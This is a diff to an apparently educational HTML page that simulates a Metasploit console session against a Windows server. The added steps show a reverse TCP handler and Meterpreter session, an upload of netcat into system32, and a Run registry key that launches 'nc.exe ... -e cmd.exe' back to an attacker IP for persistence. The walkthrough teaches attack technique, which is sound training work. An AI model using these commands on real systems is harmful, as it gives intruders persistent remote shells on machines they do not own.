@@ -54,7 +54,6 @@
             Type '?' for this help text<br />
             Type 'search windows' for a list of windows exploits<br />
             Type 'use handler' to use handler<br />
-            Type 'use exploit' to use exploit<br />
           </p>
         </div>
         <div id="search-windows" class="msf-console-command-text">
@@ -138,16 +137,102 @@
             interactive shell from which an attacker can explore the target
             machine and execute code.
           </p>
-        </div>
-        <div id="use-exploit" class="msf-console-command-text">
-          <p>Insert stuff here for exploits</p>
+          <p>
+            msf5 exploit(<span style="color: red;">multi/handler</span>) >
+            exploit
+          </p>
+          <p>
+            <span style="color: steelblue; padding-right: 3px;">[*]</span>
+            Started reverse TCP handler on 153.22.8.10:8221
+          </p>
+          <p>
+            <span style="color: steelblue; padding-right: 3px;">[*]</span>
+            Sending stage (179779 bytes) to 11.132.30.55
+          </p>
+          <p>
+            <span style="color: steelblue; padding-right: 3px;">[*]</span>
+            Meterpreter session 1 opened (153.22.8.10:8221 ->
+            11.132.30.55:11879) at <span id="theDate"></span>
+          </p>
+          <p>Type '?' for available commands</p>
         </div>
         <div id="command-not-found" class="msf-console-command-text">
           <p>Command not found. Type '?' for help.</p>
+        </div>
+        <div
+          class="msf-console-prompt"
+          id="meterpreter-console-prompt-0"
+          style="display: none;"
+        >
+          <p><u>meterpreter</u> ></p>
+          <form action="#">
+            <input
+              type="text"
+              id="console-input-0"
+              name="console-text"
+              autofocus
+              onkeypress="takeMeterpreterInput(event)"
+            />
+          </form>
+        </div>
+        <div id="meterpreter-help-text" class="msf-console-command-text">
+          <p>
+            Type '?' for this help text<br />
+            Type 'back' to return to the previous window<br />
+            Type 'upload netcat' to upload netcat to the Windows server<br />
+            Type 'reg setval' to modify the registry key<br />
+          </p>
+        </div>
+        <div id="meterpreter-netcat" class="msf-console-command-text">
+          <p>
+            <u>meterpreter</u> > upload /usr/share/windows-binaries/nc.exe
+            C:\\Windows\\system32
+          </p>
+          <p>
+            <span style="color: steelblue; padding-right: 3px;">[*]</span>
+            uploading : /usr/share/windows-binaries/nc.exe ->
+            C:\\Windows\\system32
+          </p>
+          <p>
+            <span style="color: steelblue; padding-right: 3px;">[*]</span>
+            uploaded : /usr/share/windows-binaries/nc.exe ->
+            C:\\Windows\\system32
+          </p>
+          <p>
+            What we just did is upload netcat to the windows server so we can
+            set it to run. In the next step we will configure netcat to run
+            whenever someone logs in by modifying a registry key.
+          </p>
+        </div>
+        <div id="meterpreter-help-upload" class="msf-console-command-text">
+          <p>Error: You must upload netcat first</p>
+        </div>
+        <div id="meterpreter-regkey" class="msf-console-command-text">
+          <p>
+            <u>meterpreter</u> > reg setval -k
+            HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d
+            \<br />
+            'C:\windows\system32\nc.exe 153.22.8.10 8221 -e cmd.exe'
+          </p>
+          <p>Successfully set nc of REG_SZ.</p>
+          <p>
+            Now that we've modified the registry key to send back a shell we
+            have established a<br />
+            persistant connection. All we have to do is run netcat on our kali
+            server and set it to listen<br />
+            on the port we defined above.
+          </p>
+          <p>
+            Click complete above and then home to return to the home screen.
+          </p>
         </div>
       </div>
     </div>
 
     <script src="metasploit.js"></script>
+    <script>
+      let theDate = new Date();
+      document.getElementById("theDate").innerHTML = theDate.toUTCString();
+    </script>
   </body>
 </html>
